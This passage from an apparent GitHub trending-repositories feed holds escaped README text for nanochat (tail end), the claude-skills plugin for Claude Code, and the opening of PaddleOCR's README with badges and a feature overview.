 &lt;li&gt;Thank you &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt; for the compute used in developing this project.&lt;/li&gt; 
 &lt;li&gt;Thank you to chief LLM whisperer üßô‚Äç‚ôÇÔ∏è Alec Radford for advice/guidance.&lt;/li&gt; 
 &lt;li&gt;Thank you to the repo czar Sofie &lt;a href="https://github.com/svlandeg"&gt;@svlandeg&lt;/a&gt; for help with managing issues, pull requests and discussions of nanochat.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Cite&lt;/h2&gt; 
&lt;p&gt;If you find nanochat helpful in your research cite simply as:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{nanochat,
  author = {Andrej Karpathy},
  title = {nanochat: The best ChatGPT that \$100 can buy},
  year = {2025},
  publisher = {GitHub},
  url = {https://github.com/karpathy/nanochat}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Jeffallan/claude-skills</title>
      <link>https://github.com/Jeffallan/claude-skills</link>
      <description>&lt;p&gt;65 Specialized Skills for Full-Stack Developers. Transform Claude Code into your expert pair programmer.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://capsule-render.vercel.app/api?type=waving&amp;amp;color=gradient&amp;amp;customColorList=12,14,25,27&amp;amp;height=200&amp;amp;section=header&amp;amp;text=Claude%20Skills&amp;amp;fontSize=80&amp;amp;fontColor=ffffff&amp;amp;animation=fadeIn&amp;amp;fontAlignY=35&amp;amp;desc=65%20Skills%20%E2%80%A2%209%20Workflows%20%E2%80%A2%20Built%20for%20Full-Stack%20Devs&amp;amp;descSize=20&amp;amp;descAlignY=55" width="100%" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;&lt;img src="https://img.shields.io/badge/version-0.4.5-blue.svg?style=for-the-badge" alt="Version" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;&lt;img src="https://img.shields.io/badge/Claude_Code-Plugin-purple.svg?style=for-the-badge" alt="Claude Code" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills/stargazers"&gt;&lt;img src="https://img.shields.io/github/stars/jeffallan/claude-skills?style=for-the-badge&amp;amp;color=yellow" alt="Stars" /&gt;&lt;/a&gt; &lt;a href="https://github.com/jeffallan/claude-skills/actions/workflows/ci.yml"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/jeffallan/claude-skills/ci.yml?branch=main&amp;amp;style=for-the-badge&amp;amp;label=CI" alt="CI" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;strong&gt;
  &lt;!-- SKILL_COUNT --&gt;65
  &lt;!-- /SKILL_COUNT --&gt; Skills&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- WORKFLOW_COUNT --&gt;9
  &lt;!-- /WORKFLOW_COUNT --&gt; Workflows&lt;/strong&gt; | &lt;strong&gt;Context Engineering&lt;/strong&gt; | &lt;strong&gt;Progressive Disclosure&lt;/strong&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/hesreallyhim/awesome-claude-code"&gt;&lt;img src="https://awesome.re/mentioned-badge.svg?sanitize=true" height="28" alt="Mentioned in Awesome Claude Code" /&gt;&lt;/a&gt; &lt;a href="https://github.com/Chat2AnyLLM/awesome-claude-skills/raw/main/FULL-SKILLS.md"&gt;&lt;img src="https://img.shields.io/github/stars/Chat2AnyLLM/awesome-claude-skills?style=for-the-badge&amp;amp;label=awesome-claude-skills&amp;amp;color=brightgreen&amp;amp;logo=awesomelists&amp;amp;logoColor=white" alt="Awesome Claude Skills" /&gt;&lt;/a&gt; &lt;a href="https://github.com/BehiSecc/awesome-claude-skills"&gt;&lt;img src="https://img.shields.io/github/stars/BehiSecc/awesome-claude-skills?style=for-the-badge&amp;amp;label=awesome-claude-skills&amp;amp;color=brightgreen&amp;amp;logo=awesomelists&amp;amp;logoColor=white" alt="Awesome Claude Skills (BehiSecc)" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Quick Start&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;/plugin marketplace add jeffallan/claude-skills
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;then&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;/plugin install fullstack-dev-skills@jeffallan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For all installation methods and first steps, see the &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/QUICKSTART.md"&gt;&lt;strong&gt;Quick Start Guide&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Full documentation:&lt;/strong&gt; &lt;a href="https://jeffallan.github.io/claude-skills"&gt;jeffallan.github.io/claude-skills&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Skills&lt;/h2&gt; 
&lt;!-- SKILL_COUNT --&gt;65
&lt;!-- /SKILL_COUNT --&gt; specialized skills across 12 categories covering languages, backend/frontend frameworks, infrastructure, APIs, testing, DevOps, security, data/ML, and platform specialists. 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/SKILLS_GUIDE.md"&gt;&lt;strong&gt;Skills Guide&lt;/strong&gt;&lt;/a&gt; for the full list, decision trees, and workflow combinations.&lt;/p&gt; 
&lt;h2&gt;Usage Patterns&lt;/h2&gt; 
&lt;h3&gt;Context-Aware Activation&lt;/h3&gt; 
&lt;p&gt;Skills activate automatically based on your request:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Backend Development
"Implement JWT authentication in my NestJS API"
‚Üí Activates: NestJS Expert ‚Üí Loads: references/authentication.md

# Frontend Development
"Build a React component with Server Components"
‚Üí Activates: React Expert ‚Üí Loads: references/server-components.md
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Multi-Skill Workflows&lt;/h3&gt; 
&lt;p&gt;Complex tasks combine multiple skills:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;Feature Development: Feature Forge ‚Üí Architecture Designer ‚Üí Fullstack Guardian ‚Üí Test Master ‚Üí DevOps Engineer
Bug Investigation:   Debugging Wizard ‚Üí Framework Expert ‚Üí Test Master ‚Üí Code Reviewer
Security Hardening:  Secure Code Guardian ‚Üí Security Reviewer ‚Üí Test Master
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Context Engineering&lt;/h2&gt; 
&lt;p&gt;Surface and validate Claude's hidden assumptions about your project with &lt;code&gt;/common-ground&lt;/code&gt;. See the &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/COMMON_GROUND.md"&gt;&lt;strong&gt;Common Ground Guide&lt;/strong&gt;&lt;/a&gt; for full documentation.&lt;/p&gt; 
&lt;h2&gt;Project Workflow&lt;/h2&gt; 
&lt;!-- WORKFLOW_COUNT --&gt;9
&lt;!-- /WORKFLOW_COUNT --&gt; workflow commands manage epics from discovery through retrospectives, integrating with Jira and Confluence. See 
&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/WORKFLOW_COMMANDS.md"&gt;&lt;strong&gt;Workflow Commands Reference&lt;/strong&gt;&lt;/a&gt; for the full command reference and lifecycle diagrams. 
&lt;p&gt;&amp;nbsp;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!TIP] &lt;strong&gt;Setup:&lt;/strong&gt; Workflow commands require an Atlassian MCP server. See the &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/ATLASSIAN_MCP_SETUP.md"&gt;&lt;strong&gt;Atlassian MCP Setup Guide&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/QUICKSTART.md"&gt;&lt;strong&gt;Quick Start Guide&lt;/strong&gt;&lt;/a&gt; - Installation and first steps&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/SKILLS_GUIDE.md"&gt;&lt;strong&gt;Skills Guide&lt;/strong&gt;&lt;/a&gt; - Skill reference and decision trees&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/COMMON_GROUND.md"&gt;&lt;strong&gt;Common Ground&lt;/strong&gt;&lt;/a&gt; - Context engineering with &lt;code&gt;/common-ground&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/WORKFLOW_COMMANDS.md"&gt;&lt;strong&gt;Workflow Commands&lt;/strong&gt;&lt;/a&gt; - Project workflow commands guide&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/ATLASSIAN_MCP_SETUP.md"&gt;&lt;strong&gt;Atlassian MCP Setup&lt;/strong&gt;&lt;/a&gt; - Atlassian MCP server setup&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/docs/local_skill_development.md"&gt;&lt;strong&gt;Local Development&lt;/strong&gt;&lt;/a&gt; - Local skill development&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CONTRIBUTING.md"&gt;&lt;strong&gt;Contributing&lt;/strong&gt;&lt;/a&gt; - Contribution guidelines&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;skills/*/SKILL.md&lt;/strong&gt; - Individual skill documentation&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;skills/*/references/&lt;/strong&gt; - Deep-dive reference materials&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CONTRIBUTING.md"&gt;&lt;strong&gt;Contributing&lt;/strong&gt;&lt;/a&gt; for guidelines on adding skills, writing references, and submitting pull requests.&lt;/p&gt; 
&lt;h2&gt;Changelog&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/CHANGELOG.md"&gt;Changelog&lt;/a&gt; for full version history and release notes.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT License - See &lt;a href="https://raw.githubusercontent.com/Jeffallan/claude-skills/main/LICENSE"&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt; 
&lt;h2&gt;Support&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Issues:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills/issues"&gt;GitHub Issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Discussions:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills/discussions"&gt;GitHub Discussions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Repository:&lt;/strong&gt; &lt;a href="https://github.com/jeffallan/claude-skills"&gt;github.com/jeffallan/claude-skills&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Author&lt;/h2&gt; 
&lt;p&gt;Built by &lt;a href="https://jeffallan.github.io"&gt;&lt;strong&gt;jeffallan&lt;/strong&gt;&lt;/a&gt; &lt;a href="https://www.linkedin.com/in/jeff-smolinski/"&gt;&lt;img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg?sanitize=true" width="16" height="16" alt="LinkedIn" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Principal Consultant&lt;/strong&gt; at &lt;a href="https://synergetic.solutions"&gt;&lt;strong&gt;Synergetic Solutions&lt;/strong&gt;&lt;/a&gt; &lt;a href="https://www.linkedin.com/company/synergetic-holdings"&gt;&lt;img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linkedin/linkedin-original.svg?sanitize=true" width="16" height="16" alt="LinkedIn" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Fullstack engineering, security engineering, compliance, and technical due diligence.&lt;/p&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/Jeffallan/claude-skills/stargazers"&gt;&lt;img src="https://reporoster.com/stars/Jeffallan/claude-skills" alt="Stargazers repo roster for @Jeffallan/claude-skills" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Star History&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://www.star-history.com/#Jeffallan/claude-skills&amp;amp;type=date&amp;amp;legend=top-left"&gt;&lt;img src="https://api.star-history.com/svg?repos=Jeffallan/claude-skills&amp;amp;type=date&amp;amp;legend=top-left" alt="Star History Chart" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;strong&gt;Built for Claude Code&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- WORKFLOW_COUNT --&gt;9
  &lt;!-- /WORKFLOW_COUNT --&gt; Workflows&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- REFERENCE_COUNT --&gt;359
  &lt;!-- /REFERENCE_COUNT --&gt; Reference Files&lt;/strong&gt; | &lt;strong&gt;
  &lt;!-- SKILL_COUNT --&gt;65
  &lt;!-- /SKILL_COUNT --&gt; Skills&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>PaddlePaddle/PaddleOCR</title>
      <link>https://github.com/PaddlePaddle/PaddleOCR</link>
      <description>&lt;p&gt;Turn any PDF or image document into structured data for your AI. A powerful, lightweight OCR toolkit that bridges the gap between images/PDFs and LLMs. Supports 100+ languages.&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/images/Banner.png" alt="PaddleOCR Banner" /&gt; &lt;/p&gt; 
 &lt;p&gt;English | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_cn.md"&gt;ÁÆÄ‰Ωì‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_tcn.md"&gt;ÁπÅÈ´î‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ja.md"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ko.md"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_fr.md"&gt;Fran√ßais&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ru.md"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_es.md"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ar.md"&gt;ÿßŸÑÿπÿ±ÿ®Ÿäÿ©&lt;/a&gt;&lt;/p&gt; 
 &lt;!-- icon --&gt; 
 &lt;p&gt;&lt;a href="https://github.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://img.shields.io/github/stars/PaddlePaddle/PaddleOCR?color=ccf" alt="stars" /&gt;&lt;/a&gt; &lt;a href="https://github.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://img.shields.io/github/forks/PaddlePaddle/PaddleOCR.svg?sanitize=true" alt="forks" /&gt;&lt;/a&gt; &lt;a href="https://arxiv.org/pdf/2507.05595"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR_3.0-Technical%20Report-b31b1b.svg?logo=arXiv" alt="arXiv" /&gt;&lt;/a&gt; &lt;a href="https://arxiv.org/abs/2510.14528"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL-Technical%20Report-b31b1b.svg?logo=arXiv" alt="arXiv" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://pepy.tech/projectsproject/paddleocr"&gt;&lt;img src="https://static.pepy.tech/badge/paddleocr/month" alt="PyPI Downloads" /&gt;&lt;/a&gt; &lt;a href="https://pepy.tech/projects/paddleocr"&gt;&lt;img src="https://static.pepy.tech/badge/paddleocr" alt="PyPI Downloads" /&gt;&lt;/a&gt; &lt;a href="https://github.com/PaddlePaddle/PaddleOCR/network/dependents"&gt;&lt;img src="https://img.shields.io/badge/Used%20by-6k%2B%20repositories-blue" alt="Used by" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/paddleocr/"&gt;&lt;img src="https://img.shields.io/pypi/v/paddleocr" alt="PyPI version" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/badge/python-3.8~3.12-aff.svg?sanitize=true" alt="python" /&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;img src="https://img.shields.io/badge/os-linux%2C%20win%2C%20mac-pink.svg?sanitize=true" alt="os" /&gt; &lt;img src="https://img.shields.io/badge/hardware-cpu%2C%20gpu%2C%20xpu%2C%20npu-yellow.svg?sanitize=true" alt="hardware" /&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-Apache_2.0-green" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt; &lt;a href="https://www.paddleocr.com"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR-_Offiical_Website-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;PaddleOCR is an industry-leading, production-ready OCR and document AI engine, offering end-to-end solutions from text extraction to intelligent document understanding&lt;/strong&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;h1&gt;PaddleOCR&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://www.paddlepaddle.org.cn/en"&gt;&lt;img src="https://img.shields.io/badge/PaddlePaddle-3.0-orange" alt="Framework" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Recognition%20Accuracy-%F0%9F%8F%86-green" alt="Accuracy" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Support_Languages-100+-brightgreen" alt="Multi-Language" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Handwriting-%E2%9C%93-success" alt="Handwriting" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Heterogeneous%20Hardware-Kunlunxin%20%7C%20Ascend_NPU-red" alt="Hardware" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!TIP] PaddleOCR now provides an MCP server that supports integration with Agent applications like Claude Desktop. For details, please refer to &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/mcp_server.html"&gt;PaddleOCR MCP Server&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The PaddleOCR 3.0 Technical Report is now available. See details at: &lt;a href="https://arxiv.org/abs/2507.05595"&gt;PaddleOCR 3.0 Technical Report&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The PaddleOCR-VL Technical Report is now available. See details at &lt;a href="https://arxiv.org/abs/2510.14528"&gt;PaddleOCR-VL Technical Report&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The Beta version of the PaddleOCR official website is now live, offering a more convenient online experience and large-scale PDF file parsing, as well as free API and MCP services. For more details, please visit the &lt;a href="https://www.paddleocr.com"&gt;PaddleOCR official website&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;PaddleOCR&lt;/strong&gt; converts documents and images into &lt;strong&gt;structured, AI-friendly data&lt;/strong&gt; (like JSON and Markdown) with &lt;strong&gt;industry-leading accuracy&lt;/strong&gt;‚Äîpowering AI applications for everyone from indie developers and startups to large enterprises worldwide. With over &lt;strong&gt;60,000 stars&lt;/strong&gt; and deep integration into leading projects like &lt;strong&gt;MinerU, RAGFlow, pathway and cherry-studio&lt;/strong&gt;, PaddleOCR has become the &lt;strong&gt;premier solution&lt;/strong&gt; for developers building intelligent document applications in the &lt;strong&gt;AI era&lt;/strong&gt;.&lt;/p&gt; 
&lt;h3&gt;PaddleOCR 3.0 Core Features&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/paddleocr"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Official_Website-1927BA?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAMAAADDpiTIAAAABlBMVEU2P+X///+1KuUwAAAHKklEQVR42u3dS5bjOAwEwALvf2fMavZum6IAImI7b2yYSqU+1Zb//gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADKCR/+fzly7rD92yVg69xh8zeLwOa5w+ZvFYHtc4ft3ykB++cOm79PAp6YO2z/Ngl4ZO5l+9+yT4QAvLqS748VF33Ylzdvzpl72f6z53YIGJ6SZdPeNHcIwOycaADdLgCSIgAIgCOAACAAykIAEAAEAAFAABCAT+WQuQVgeBqXhXQIQAAYegowLQBpbg3gZGFyAC6vgBQAMREA2/YfDPxyaDQNyTNz+3Zwn5J4ZG7PB2h0kHhi7plPCImmJwkPzO0RMa3OET0i5uGlzHFze0xcu0vE2Dq3J4U2vEPgSaHbFzPNDQAAAAAAAMBNovdw+cP/ny+uaf7w/+eYADy8kE+F4Offdjn6zZXhAXgiA78G4MNNsmnu1Xr7b3mbOL8T5Ja5bw/A35EC2LiWpzt1y9jRugBy30fLg3NvHPvnuZcC2NsCUXA/aRmA89V07Fwgt37uH8deCmBr6N44pP4UgaUATpdA7v/cMbIB8okliY65/SW5HhJ1ehPmM+8edwXgpbu4R88FayR32Y/P7oZZbOx13/Zr//ZHx27bAPnkFoyewYlbAhD3TvBobr95gaUAtr1EdNx1lgI4OcTTuR3z6+FZMEDRcu9ZCuDgGCdyGxMa4EgBRMvcjrkM7NgBZw5c0TwAUWUhZwRXA2xaya65Xa3jO2qYZ8bu2AD5w38tG5V8aZpoGN6Tz0bOfa9bceyWAciTO0jWyO1Tc5cLwJmF/JfPnXVyu3/slgHIg1n79O2O5fZv+1cHV7sC2HYqmUdHysNzX3sVkMcjUK5Gc+dMs28E5bGtm0V3gloBOP9vgZv+4sYn3RUaYFMCol5uN77g6lUApc8pWs69Zn7snS9Z9Q8G0S0AUTVUUTG3A54R1KSvo/diLAv5fKzynZeN6xogC75u93+AtBTA47OlAFSv6qY/vp3DAjD8iv2ZdFYJwKynMhTK1rInPfzaxW81LnvSgFP9KxrATaCLA3DxHpbFX31ZyNm5XRZyXG5bNkAWfP0rcrsUwOgC6NIAzgBcBiqAWwPgLrAGuGBP6jr2sifdfiJ6QQM4Bbw4AK4B3129ZSFn53ZZyA/GyFty27IBFMDFAXAG8PbyLQv5xULGPRl0K3h2AbwcgCZPhs+LD1zLnjS6AN4NwMU/DVFh7LyhASreTbvqrxdr/J4XT4Swz4FrTS+AGJ7bNbwAYkxuWzZAVljHrJfbjb9wviYXwFO/FJ8Vli4vaICsEMFyBbA3tmtsAUS0zG1c/bj4YwsZH2/+Whd0+1Nb+S7IE2sfPw4RL0XmsR8Nqvz7qFngmPHF34EqjP15AAofAkosZKPC/K6FVoeP02Ehi540NG6AK/4pYP3cLgVwXwHkDQ1QcSGb/uF4WwCmfX8u/+4vgLINcMUlQIfcLgXwXAF0+